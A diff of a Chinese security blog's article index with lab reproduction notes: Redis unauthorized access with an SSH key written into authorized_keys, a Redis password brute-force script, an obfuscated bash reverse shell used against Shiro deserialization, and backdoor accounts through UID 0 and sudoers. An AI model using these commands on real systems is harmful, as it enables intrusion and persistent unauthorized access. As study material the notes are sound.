-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162939325.png" alt="image-20210809162939325" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162939325.png" class="lozad post-image"></p>
-<p>但是这样意义不大，据说centos无以上坑点。</p>
-<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>1、攻击机生成ssh密钥（空密码）</p>
-<pre class="highlight"><span class="line">ssh-keygen -t rsa		# 全部回车</span><br><span class="line">cd .ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt		# 写入公钥</span><br></pre>
-
-<p>2、设置redis变量</p>
-<pre class="highlight"><span class="line">cat ./key.txt | redis-cli -h 192.168.24.79 -x set tide		# 将公钥内容设置给redis变量（靶机ip）</span><br></pre>
-
-<p>3、连接redis并写入</p>
-<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /root/.ssh					# 默认公私钥路径</span><br><span class="line">config set dbfilename authorized_keys		# 写入authorized_keys</span><br><span class="line">save</span><br></pre>
-
-<p>4、检查靶机文件是否写入–已写入（同样带有乱码）</p>
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162954548.png" alt="image-20210809162954548" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162954548.png" class="lozad post-image"></p>
-<p>5、攻击机进行ssh连接</p>
-<pre class="highlight"><span class="line">ssh -o StrictHostKeyChecking=no 192.168.24.79		# 首次连接需要加-o StrictHostKeyChecking=no</span><br></pre>
-
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163005569.png" alt="image-20210809163005569" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163005569.png" class="lozad post-image"></p>
-<p>连接成功</p>
-<p>（注：靶机需要安装ssh服务并关闭防火墙，或者允许22端口通过防火墙）</p>
-<p>附Ubuntu安装ssh</p>
-<pre class="highlight"><span class="line">sudo apt-get install openssh-server		# 安装ssh</span><br><span class="line">sudo /etc/init.d/ssh start 				# 开启ssh</span><br><span class="line">ufw allow 22/tcp						# 允许通过防火墙</span><br><span class="line">或</span><br><span class="line">sudo ufw disable						# 不建议</span><br></pre>
-
-<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>redis:4.x - redis:5.0.5版本漏洞，redis开启主从复制，主从数据相同，主redis只写，从redis只读，从而减小服务器压力。在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so恶意文件，就可以拓展新命令。</p>
-<p>到这里懒癌犯了，不想搭环境了，附上脚本下载链接，直接过，遇到回头再来。</p>
-<pre class="highlight"><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br></pre>
-
-<p>这里还有个内网redis利用姿势–gopher协议，一并懒过去。</p>
-<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>感觉这个比较实用，弱口令yyds！</p>
-<p>准备：</p>
-<p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163040446.png" alt="image-20210809163040446" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163040446.png" class="lozad post-image"></p>
-<p>密码登录</p>
-<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79 -a password</span><br></pre>
-
-<p>以上，开始编写Python脚本</p>
-<pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：redis未授权访问探测 + 密码爆破</span><br><span class="line">    author: chen</span><br><span class="line">    date: 2021-07-03</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc():</span><br><span class="line">    global flag</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    # 发送INFO，如果无密码则返回服务器信息，包含版本信息；如果有密码，则返回“-NOAUTH Authentication required”</span><br><span class="line">    s.send(&#x27;INFO\r\n&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    if &quot;redis_version&quot; in result:</span><br><span class="line">        print(&quot;存在redis未授权访问漏洞！&quot;)</span><br><span class="line">        flag = True</span><br><span class="line">    elif &quot;Authentication&quot; in result:</span><br><span class="line">        flag = False</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;未知错误&quot;)</span><br><span class="line">        flag = None</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def burst():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, port))</span><br><span class="line">        _pass = q.get()</span><br><span class="line">        msg = &quot;AUTH &quot; + _pass + &quot;\r\n&quot;          # AUTH pass 为redis密码格式</span><br><span class="line">        s.send(msg.encode(&#x27;utf-8&#x27;))</span><br><span class="line">        result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if &#x27;+OK&#x27; in result:</span><br><span class="line">            print(&quot;存在弱口令，密码为%s&quot; % _pass)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if len(sys.argv) != 5:</span><br><span class="line">        print(&quot;请按照格式输出：\n&quot;)</span><br><span class="line">        print(&quot;redis.py 10.10.10.10 6379 字典名 线程数 \n&quot;)</span><br><span class="line"></span><br><span class="line">    flag = True</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    ip = sys.argv[1]</span><br><span class="line">    port = int(sys.argv[2])</span><br><span class="line">    dic = sys.argv[3]</span><br><span class="line">    thread = sys.argv[4]</span><br><span class="line"></span><br><span class="line">    poc()</span><br><span class="line"></span><br><span class="line">    if flag:</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        path = os.path.dirname(os.path.realpath(__file__))      # 获取当前脚本目录</span><br><span class="line">        for i in open(path + &#x27;/&#x27; + dic):</span><br><span class="line">            q.put(i.strip())                                    # 清洗字符，去掉头尾的换行和空格</span><br><span class="line">        for i in range(int(thread)):</span><br><span class="line">            t = threading.Thread(target=burst(), daemon=True)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        pass</span><br></pre>
-
-<p>结果：</p>
-<p>空密码：</p>
-<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163058335.png" alt="image-20210809163058335" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163058335.png" class="lozad post-image"></p>
-<p>设置密码</p>
-<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163105143.png" alt="image-20210809163105143" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163105143.png" class="lozad post-image"></p>
-<p>————————————————————————————————————————————————————————————</p>
-<p>修改脚本，链接：</p>
-<p><a href="https://www.zerochen.top/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/">Pocsuite3重写redis脚本 (zerochen.top)</a></p>
-<h1 id="四、修复"><a href="#四、修复" class="headerlink" title="四、修复"></a>四、修复</h1><h2 id="指定ip登录"><a href="#指定ip登录" class="headerlink" title="指定ip登录"></a>指定ip登录</h2><p>在redis.conf文件找到# bind 127.0.0.1，去掉注释，修改为指定的登录ip</p>
-<p>缺点：多点登陆失效。</p>
-<h2 id="增加密码"><a href="#增加密码" class="headerlink" title="增加密码"></a>增加密码</h2><p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Redis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Shiro反序列化漏洞复现</title>
-    <url>/article/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
-<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
-<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
-
-<p>b、使用xray检测，直接发送payload</p>
-<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>
-
-<p>或指定脚本检测</p>
-<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>
-
-<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Shiro</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>TOP10漏洞探测点</title>
     <url>/article/TOP10%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B%E7%82%B9/</url>
     <content><![CDATA[<table>
@@ -5416,6 +5416,57 @@
       </categories>
       <tags>
         <tag>随记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows搭建IIS+MSSql</title>
+    <url>/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/</url>
+    <content><![CDATA[<h1 id="一、搭建IIS服务"><a href="#一、搭建IIS服务" class="headerlink" title="一、搭建IIS服务"></a>一、搭建IIS服务</h1><h2 id="1、搭建IIS服务"><a href="#1、搭建IIS服务" class="headerlink" title="1、搭建IIS服务"></a>1、搭建IIS服务</h2><p>开始-管理工具-服务器管理器-角色-IIS服务-自定义服务（ASP模块、FTP模块等）</p>
+<h2 id="2、导入ASP网站"><a href="#2、导入ASP网站" class="headerlink" title="2、导入ASP网站"></a>2、导入ASP网站</h2><p>选择网站路径</p>
+<p>修改网站访问端口号</p>
+<h2 id="3、网站配置"><a href="#3、网站配置" class="headerlink" title="3、网站配置"></a>3、网站配置</h2><table>
+<thead>
+<tr>
+<th align="left">报错类型</th>
+<th align="left">做法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">403（无访问主程序）</td>
+<td align="left">修改默认文档，增加index.asp</td>
+</tr>
+<tr>
+<td align="left">500（无法访问文件）</td>
+<td align="left">ASP-启用父路径</td>
+</tr>
+<tr>
+<td align="left">提示未启用32位程序池</td>
+<td align="left">应用程序池-网站-高级设置-32位应用程序池-True</td>
+</tr>
+<tr>
+<td align="left">没有操作权限</td>
+<td align="left">修改www目录权限： 属性-安全-编辑-修改Users权限为完全控制</td>
+</tr>
+</tbody></table>
+<h1 id="安装SQL-Server数据库并导入原有数据库"><a href="#安装SQL-Server数据库并导入原有数据库" class="headerlink" title="安装SQL Server数据库并导入原有数据库"></a>安装SQL Server数据库并导入原有数据库</h1><p>1、winserver2008连接sql server镜像，选择安装（精简功能）</p>
+<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" alt="image-20210809143026487" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" class="lozad post-image"></p>
+<p>2、限制数据库权限（从管理员权限降权）</p>
+<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" alt="image-20210809143259187" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" class="lozad post-image"></p>
+<p>3、混合模式，设置密码，添加管理员</p>
+<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" alt="image-20210809143322279" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" class="lozad post-image"></p>
+<p>4、后续全部确认即可</p>
+<p>5、新建数据库（testdb）</p>
+<p>6、修改网站数据库配置文件，数据库类型为mssql</p>
+<p>7、替换网站原有数据库</p>
+<p>8、修改网站数据库配置文件</p>
+<p>新增数据库名（testdb）、数据库账号（sa）、数据库密码（***）</p>
+<p>注意：mssql账号为sa</p>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>IIS</tag>
       </tags>
   </entry>
   <entry>
@@ -5798,57 +5849,6 @@
       </categories>
       <tags>
         <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows搭建IIS+MSSql</title>
-    <url>/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/</url>
-    <content><![CDATA[<h1 id="一、搭建IIS服务"><a href="#一、搭建IIS服务" class="headerlink" title="一、搭建IIS服务"></a>一、搭建IIS服务</h1><h2 id="1、搭建IIS服务"><a href="#1、搭建IIS服务" class="headerlink" title="1、搭建IIS服务"></a>1、搭建IIS服务</h2><p>开始-管理工具-服务器管理器-角色-IIS服务-自定义服务（ASP模块、FTP模块等）</p>
-<h2 id="2、导入ASP网站"><a href="#2、导入ASP网站" class="headerlink" title="2、导入ASP网站"></a>2、导入ASP网站</h2><p>选择网站路径</p>
-<p>修改网站访问端口号</p>
-<h2 id="3、网站配置"><a href="#3、网站配置" class="headerlink" title="3、网站配置"></a>3、网站配置</h2><table>
-<thead>
-<tr>
-<th align="left">报错类型</th>
-<th align="left">做法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">403（无访问主程序）</td>
-<td align="left">修改默认文档，增加index.asp</td>
-</tr>
-<tr>
-<td align="left">500（无法访问文件）</td>
-<td align="left">ASP-启用父路径</td>
-</tr>
-<tr>
-<td align="left">提示未启用32位程序池</td>
-<td align="left">应用程序池-网站-高级设置-32位应用程序池-True</td>
-</tr>
-<tr>
-<td align="left">没有操作权限</td>
-<td align="left">修改www目录权限： 属性-安全-编辑-修改Users权限为完全控制</td>
-</tr>
-</tbody></table>
-<h1 id="安装SQL-Server数据库并导入原有数据库"><a href="#安装SQL-Server数据库并导入原有数据库" class="headerlink" title="安装SQL Server数据库并导入原有数据库"></a>安装SQL Server数据库并导入原有数据库</h1><p>1、winserver2008连接sql server镜像，选择安装（精简功能）</p>
-<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" alt="image-20210809143026487" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" class="lozad post-image"></p>
-<p>2、限制数据库权限（从管理员权限降权）</p>
-<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" alt="image-20210809143259187" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" class="lozad post-image"></p>
-<p>3、混合模式，设置密码，添加管理员</p>
-<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" alt="image-20210809143322279" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" class="lozad post-image"></p>
-<p>4、后续全部确认即可</p>
-<p>5、新建数据库（testdb）</p>
-<p>6、修改网站数据库配置文件，数据库类型为mssql</p>
-<p>7、替换网站原有数据库</p>
-<p>8、修改网站数据库配置文件</p>
-<p>新增数据库名（testdb）、数据库账号（sa）、数据库密码（***）</p>
-<p>注意：mssql账号为sa</p>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>IIS</tag>
       </tags>
   </entry>
   <entry>
@@ -6792,54 +6792,6 @@
       </tags>
   </entry>
   <entry>
-    <title>创建用户+提权</title>
-    <url>/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7-%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
-<h1 id="linux环境"><a href="#linux环境" class="headerlink" title="linux环境"></a>linux环境</h1><h2 id="1、创建普通用户"><a href="#1、创建普通用户" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">useradd test	#创建test用户</span><br><span class="line">passwd test		#给test用户设置密码</span><br></pre>
-
-<h2 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>a、修改/etc/sudoers文件，将#去掉</p>
-<pre class="highlight"><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel    ALL=(ALL)    ALL</span><br></pre>
-
-<p>b、然后修改用户，使其属于root组</p>
-<pre class="highlight"><span class="line">usermod -g root test</span><br></pre>
-
-<p>c、使用test账号登录，su -切回root，再切回test即为root权限</p>
-<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>a、修改/etc/sudoers文件，找到root并添加</p>
-<pre class="highlight"><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root    ALL=(ALL)     ALL</span><br><span class="line">test   	ALL=(ALL)     ALL</span><br></pre>
-
-<p>b、使用test账号登录，即可使用sudo权限操作</p>
-<p>如：sudo ls</p>
-<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0</p>
-<pre class="highlight"><span class="line">test:x:0:1000::/home/test:/bin/sh</span><br></pre>
-
-<p>b、切换至test用户，输入test密码即可登陆至root账户</p>
-<h2 id="3、删除用户"><a href="#3、删除用户" class="headerlink" title="3、删除用户"></a>3、删除用户</h2><pre class="highlight"><span class="line">userdel -r test		#删除用户及其主目录</span><br></pre>
-
-<h2 id="注！非交互式shell修改密码"><a href="#注！非交互式shell修改密码" class="headerlink" title="注！非交互式shell修改密码"></a>注！非交互式shell修改密码</h2><pre class="highlight"><span class="line">echo &quot;test:123&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot; | passwd --stdin &quot;test&quot;</span><br></pre>
-
-
-
-<h1 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h1><h2 id="1、创建普通用户-1"><a href="#1、创建普通用户-1" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">net user test 123456 /add		#添加test用户，密码为12356</span><br><span class="line">net user $test 123456 /add		#添加隐藏test用户，密码为12356</span><br></pre>
-
-<h2 id="2、添加用户至管理员组"><a href="#2、添加用户至管理员组" class="headerlink" title="2、添加用户至管理员组"></a>2、添加用户至管理员组</h2><pre class="highlight"><span class="line">net localgroup administrators test /add		#添加test用户至管理员组</span><br></pre>
-
-<p>查看管理员组成员</p>
-<pre class="highlight"><span class="line">net localgroup administrators		#查看管理员组成员</span><br></pre>
-
-<p>删除用户</p>
-<pre class="highlight"><span class="line">net localgroup administrators test /del		#删除用户</span><br></pre>
-
-<p>禁用用户/启用用户</p>
-<pre class="highlight"><span class="line">net user test /active:no		#禁用test用户</span><br><span class="line">net user test /active:yes		#启用test用户</span><br></pre>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>信息收集</title>
     <url>/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
     <content><![CDATA[<table>
@@ -7069,6 +7021,54 @@
       </tags>
   </entry>
   <entry>
+    <title>创建用户+提权</title>
+    <url>/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7-%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
+<h1 id="linux环境"><a href="#linux环境" class="headerlink" title="linux环境"></a>linux环境</h1><h2 id="1、创建普通用户"><a href="#1、创建普通用户" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">useradd test	#创建test用户</span><br><span class="line">passwd test		#给test用户设置密码</span><br></pre>
+
+<h2 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>a、修改/etc/sudoers文件，将#去掉</p>
+<pre class="highlight"><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel    ALL=(ALL)    ALL</span><br></pre>
+
+<p>b、然后修改用户，使其属于root组</p>
+<pre class="highlight"><span class="line">usermod -g root test</span><br></pre>
+
+<p>c、使用test账号登录，su -切回root，再切回test即为root权限</p>
+<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>a、修改/etc/sudoers文件，找到root并添加</p>
+<pre class="highlight"><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root    ALL=(ALL)     ALL</span><br><span class="line">test   	ALL=(ALL)     ALL</span><br></pre>
+
+<p>b、使用test账号登录，即可使用sudo权限操作</p>
+<p>如：sudo ls</p>
+<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0</p>
+<pre class="highlight"><span class="line">test:x:0:1000::/home/test:/bin/sh</span><br></pre>
+
+<p>b、切换至test用户，输入test密码即可登陆至root账户</p>
+<h2 id="3、删除用户"><a href="#3、删除用户" class="headerlink" title="3、删除用户"></a>3、删除用户</h2><pre class="highlight"><span class="line">userdel -r test		#删除用户及其主目录</span><br></pre>
+
+<h2 id="注！非交互式shell修改密码"><a href="#注！非交互式shell修改密码" class="headerlink" title="注！非交互式shell修改密码"></a>注！非交互式shell修改密码</h2><pre class="highlight"><span class="line">echo &quot;test:123&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot; | passwd --stdin &quot;test&quot;</span><br></pre>
+
+
+
+<h1 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h1><h2 id="1、创建普通用户-1"><a href="#1、创建普通用户-1" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">net user test 123456 /add		#添加test用户，密码为12356</span><br><span class="line">net user $test 123456 /add		#添加隐藏test用户，密码为12356</span><br></pre>
+
+<h2 id="2、添加用户至管理员组"><a href="#2、添加用户至管理员组" class="headerlink" title="2、添加用户至管理员组"></a>2、添加用户至管理员组</h2><pre class="highlight"><span class="line">net localgroup administrators test /add		#添加test用户至管理员组</span><br></pre>
+
+<p>查看管理员组成员</p>
+<pre class="highlight"><span class="line">net localgroup administrators		#查看管理员组成员</span><br></pre>
+
+<p>删除用户</p>
+<pre class="highlight"><span class="line">net localgroup administrators test /del		#删除用户</span><br></pre>
+
+<p>禁用用户/启用用户</p>
+<pre class="highlight"><span class="line">net user test /active:no		#禁用test用户</span><br><span class="line">net user test /active:yes		#启用test用户</span><br></pre>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>反弹shell归纳</title>
     <url>/article/%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3/</url>
     <content><![CDATA[<h1 id="Linux反弹shell归纳"><a href="#Linux反弹shell归纳" class="headerlink" title="Linux反弹shell归纳"></a>Linux反弹shell归纳</h1><p>注意：若是实战环境，反弹shell目标需要为公网ip。（搭服务器）</p>
@@ -7210,50 +7210,6 @@
       </categories>
       <tags>
         <tag>反弹shell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搭建LAMP环境</title>
-    <url>/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
-<h1 id="1、安装Apache（httpd）"><a href="#1、安装Apache（httpd）" class="headerlink" title="1、安装Apache（httpd）"></a>1、安装Apache（httpd）</h1><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
-
-<h1 id="2、启动apache并设置开机自启"><a href="#2、启动apache并设置开机自启" class="headerlink" title="2、启动apache并设置开机自启"></a>2、启动apache并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start httpd		#开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd		#查看apache状态</span><br></pre>
-
-<h1 id="3、安装Mysql"><a href="#3、安装Mysql" class="headerlink" title="3、安装Mysql"></a>3、安装Mysql</h1><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
-
-<h1 id="4、启动Mysql并设置开机自启"><a href="#4、启动Mysql并设置开机自启" class="headerlink" title="4、启动Mysql并设置开机自启"></a>4、启动Mysql并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start mariadb			#开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb		#查看mariadb状态</span><br></pre>
-
-<h1 id="5、配置Mysql数据库"><a href="#5、配置Mysql数据库" class="headerlink" title="5、配置Mysql数据库"></a>5、配置Mysql数据库</h1><pre class="highlight"><span class="line">mysql_secure_installation		#初始化mysql数据库（全部回车确认）</span><br></pre>
-
-<p>设置mysql密码（非操作系统密码）</p>
-<h1 id="6、安装PHP"><a href="#6、安装PHP" class="headerlink" title="6、安装PHP"></a>6、安装PHP</h1><p>(php-fpm php-mysqlnd不装，其他均可)</p>
-<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
-
